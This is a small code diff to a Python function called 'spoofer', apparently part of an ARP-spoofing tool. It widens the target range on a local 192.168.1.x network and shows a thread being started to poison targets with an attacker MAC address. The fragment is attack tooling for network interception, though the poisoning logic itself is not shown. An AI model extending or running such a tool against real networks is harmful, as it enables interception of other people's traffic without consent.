@@ -59,7 +59,7 @@ def spoofer():
     threadsNum = 0
 
     potentialTargets = []
-    for i in range(2, 20):
+    for i in range(2, 120):
         ip = "192.168.1." + str(i)
         potentialTargets.append(ip)
 
@@ -88,3 +88,4 @@ def spoofer():
                                      args=(targets, gateway,
                                            attacker_MAC))
     poison_thread.start()
+
